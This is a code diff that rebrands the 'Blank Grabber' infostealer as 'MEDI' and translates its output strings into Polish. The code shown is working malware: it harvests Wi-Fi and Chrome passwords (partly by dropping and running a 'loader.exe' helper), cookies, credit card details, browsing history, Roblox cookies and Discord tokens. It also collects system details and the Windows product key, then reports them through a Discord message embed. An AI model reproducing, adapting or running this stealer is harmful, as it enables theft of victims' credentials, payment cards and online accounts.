@@ -722,21 +722,21 @@ class BlankGrabber:
     def __init__(self) -> None:
         self.tempfolder = os.path.join(os.getenv('temp'), utils.generate(invisible= True))
         self.system = os.path.join(self.tempfolder, 'System')
-        self.archive = os.path.join(os.getenv('temp'), 'Blank-{}.zip'.format(os.getlogin()))
+        self.archive = os.path.join(os.getenv('temp'), 'Grabber_MEDI-{}.zip'.format(os.getlogin()))
         self.localappdata = os.getenv('localappdata')
         self.roaming = os.getenv('appdata')
         self.http = urllib3.PoolManager()
         self.collection = {
-            'Cookies' : 0,
-            'Passwords' : 0,
-            'Credit Cards' : 0,
-            'History' : 0,
-            'Webcam' : 0,
+            'Cookie' : 0,
+            'Hasła' : 0,
+            'Karty' : 0,
+            'Historia' : 0,
+            'Kamery' : 0,
             'Discord Info' : 0,
-            'Roblox Cookies' : 0,
-            'Games' : 0,
+            'Roblox Cookie' : 0,
+            'Gry' : 0,
             'Screenshot' : 0,
-            'Wifi Passwords' : 0
+            'Wifi Hasła' : 0
         }
 
         while(os.path.isdir(self.tempfolder)):
@@ -784,7 +784,7 @@ class BlankGrabber:
     
     def errReport(self) -> None:
         if utils.ERRORLOGS:
-            with open(os.path.join(self.tempfolder, 'Error Logs.txt'), 'w') as file:
+            with open(os.path.join(self.tempfolder, 'Logi_ERROR.txt'), 'w') as file:
                 file.write('\n===============================================================================\n'.join(utils.ERRORLOGS))
     
     def cleanUp(self) -> None:
@@ -798,12 +798,12 @@ class BlankGrabber:
         passwords = utils.getWifiPasswords()
         profiles = list()
         for profile, psw in passwords.items():
-            profiles.append(f'Network: {profile}\nPassword: {psw}')
-        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            profiles.append(f'Internet: {profile}\nHasło: {psw}')
+        divider = '\n\n' + 'MEDI GRABBER'.center(50, '=') + '\n\n'
         if profiles:
-            with open(os.path.join(self.system, 'Wifi Networks.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
+            with open(os.path.join(self.system, 'Wifi Internety.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
                 file.write(divider.lstrip() + divider.join(profiles))
-            self.collection['Wifi Passwords'] += len(profiles)
+            self.collection['Wifi Hasła'] += len(profiles)
     
     @utils.catch
     def discordInjection(self) -> None:
@@ -837,7 +837,7 @@ class BlankGrabber:
         
     @utils.catch
     def captureBrowserPasswords(self) -> None:        
-        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'getPass')):
+        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'loader')):
             vault = Browsers.getChromePass()
             passwords = list()
             if not vault:
@@ -846,11 +846,11 @@ class BlankGrabber:
                 URL = i.get('URL')
                 USERNAME = i.get('USERNAME')
                 PASSWORD = i.get('PASSWORD')
-                passwords.append('URL: {}\nUSERNAME: {}\nPASSWORD: {}'.format(URL, USERNAME, PASSWORD))
+                passwords.append('Link: {}\nNazwa: {}\nHasło: {}'.format(URL, USERNAME, PASSWORD))
             os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
-            divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            divider = '\n\n' + 'MEDI'.center(50, '=') + '\n\n'
             if passwords:
-                with open(os.path.join(credentials, 'Chrome Passwords.txt'), 'w') as file:
+                with open(os.path.join(credentials, 'Chrome Hasła.txt'), 'w') as file:
                     file.write(divider.lstrip() + divider.join(passwords))
                 self.collection['Passwords'] += len(passwords)
         else:
@@ -861,31 +861,31 @@ class BlankGrabber:
             if not b'This program cannot be run in DOS mode.' in data:
                 return
             if hasattr(sys, 'frozen'):
-                tempGetPass = os.path.join(MEIPASS, 'getPass.exe')
+                temploader = os.path.join(MEIPASS, 'loader.exe')
             else:
-                tempGetPass = os.path.join(os.getenv('temp'), 'getPass.exe')
-            with open(tempGetPass, 'wb') as file:
+                temploader = os.path.join(os.getenv('temp'), 'loader.exe')
+            with open(temploader, 'wb') as file:
                 file.write(data)
-            tempGetPassPath = os.path.dirname(tempGetPass)
+            temploaderPath = os.path.dirname(temploader)
             try:
-                subprocess.run('getPass.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= tempGetPassPath)
+                subprocess.run('loader.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= temploaderPath)
             except subprocess.TimeoutExpired:
-                os.remove(tempGetPass)
+                os.remove(temploader)
                 return
-            os.remove(tempGetPass)
-            if os.path.isfile(tempGetPassCFG := os.path.join(tempGetPassPath, 'getPass.cfg')):
-                os.remove(tempGetPassCFG)
-            with open(passfile := os.path.join(tempGetPassPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
+            os.remove(temploader)
+            if os.path.isfile(temploaderCFG := os.path.join(temploaderPath, 'loader.cfg')):
+                os.remove(temploaderCFG)
+            with open(passfile := os.path.join(temploaderPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
                 data = file.read()
             if 'URL' in data:
-                divider = 'Blank Grabber'.center(50, '=')
+                divider = 'MEDI'.center(50, '=')
                 data = list(['\n'.join(x.replace('=' * 50, divider, 1).splitlines()[:-1]) for x in data.split('\n\n') if x != ''])
             os.remove(passfile)
             if data:
                 os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
-                with open(os.path.join(credentials, 'Passwords.txt'), 'w') as file:
+                with open(os.path.join(credentials, 'Hasła.txt'), 'w') as file:
                     file.write('\n\n'.join(data))
-                self.collection['Passwords'] += len(data)
+                self.collection['Hasła'] += len(data)
     
     @utils.catch
     def captureChromeCookies(self) -> None:
@@ -902,7 +902,7 @@ class BlankGrabber:
             cookies.append('{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(HOST, 'FALSE' if EXPIRY == 0 else 'TRUE', PATH, 'FALSE' if HOST.startswith('.') else 'TRUE', EXPIRY, NAME, COOKIE))
         os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
         divider = '\n'
-        with open(os.path.join(credentials, 'Chrome Cookies.txt'), 'w') as file:
+        with open(os.path.join(credentials, 'Chrome Cookie.txt'), 'w') as file:
             file.write(divider.join(cookies))
         self.collection['Cookies'] += len(cookies)
         self.robloxStealer(cookies)
@@ -915,8 +915,8 @@ class BlankGrabber:
             return
         for i in vault:
             NAME, MONTH, YEAR, NUMBER = i.get('NAME'), i.get('MONTH'), i.get('YEAR'), i.get('NUMBER')
-            cards.append('Name On Card: {}\nExpiration Month: {}\nExpiration Year: {}\nCard Number: {}'.format(NAME, MONTH, YEAR, NUMBER))
-        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            cards.append('Imię Na Karcie: {}\nWygasnięcie Miesiąc: {}\nWygaśnięcie Rok: {}\nNumer Karty: {}'.format(NAME, MONTH, YEAR, NUMBER))
+        divider = '\n\n' + 'MEDI'.center(50, '=') + '\n\n'
         os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
         with open(os.path.join(credentials, 'Chrome CC.txt'), 'w') as file:
             file.write(divider.lstrip() + divider.join(cards))
@@ -930,12 +930,12 @@ class BlankGrabber:
             return
         for i in vault:
             URL, TITLE, VC, _ = i
-            history.append('Title: {}\nURL: {}\nVisit Count: {}'.format(TITLE, URL, VC))
-        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            history.append('Tytuł: {}\nLink: {}\nViOdwiedzenia: {}'.format(TITLE, URL, VC))
+        divider = '\n\n' + 'MEDI'.center(50, '=') + '\n\n'
         os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
-        with open(os.path.join(credentials, 'Chrome History.txt'), 'w', encoding= 'utf-8') as file:
+        with open(os.path.join(credentials, 'Chrome Historia.txt'), 'w', encoding= 'utf-8') as file:
             file.write(divider.lstrip() + divider.join(history))
-        self.collection['History'] += len(history)
+        self.collection['Historia'] += len(history)
 
     @utils.catch
     def minecraftStealer(self) -> None:
@@ -969,7 +969,7 @@ class BlankGrabber:
             for j in re.findall(r'_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+', i):
                 check(j)
         if robloxcookies:
-            division = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            division = '\n\n' + 'MEDI'.center(50, '=') + '\n\n'
             os.makedirs(rbdir := os.path.join(self.tempfolder, 'Gaming', 'Roblox'), exist_ok= True)
             with open(os.path.join(rbdir, 'Roblox Cookies.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                 file.write((division).join(robloxcookies))
@@ -1065,7 +1065,7 @@ class BlankGrabber:
         data = Discord.getTokens()
         if not data:
             return
-        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+        divider = '\n\n' + 'MEDI'.center(50, '=') + '\n\n'
         tokenData = list()
         for i in data:
             USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = i.values()
@@ -1139,15 +1139,15 @@ class BlankGrabber:
   'content': '@everyone' if PINGME else '',
   'embeds': [
     {
-      'title': 'Blank Grabber',
-      'description': f'**__System Info__\n```autohotkey\nComputer Name: {ComputerName}\nComputer OS: {ComputerOS}\nTotal Memory: {TotalMemory}\nUUID: {UUID}\nCPU: {CPU}\nGPU: {GPU}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**',
-      'url': 'https://github.com/Blank-c/Blank-Grabber',
+      'title': 'MEDI',
+      'description': f'**__System Info__\n```autohotkey\nNazwa Komputera: {ComputerName}\nSystem Komputera: {ComputerOS}\nRam: {TotalMemory}\nHWID: {UUID}\nProcesor: {CPU}\nKarta Grabiczna: {GPU}\nKlucz Windows: {productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**',
+      'url': 'https://discord.gg/Mup4VzgQB9',
       'color': 34303,
       'footer': {
-        'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'
+        'text': 'Grabbed by MEDI | https://discord.gg/Mup4VzgQB9'
       },
       'thumbnail': {
-        'url': 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
+        'url': 'https://media.tenor.com/XXAXt1WWm3YAAAAi/pepe-hack-hack.gif'
       }
     }
   ]
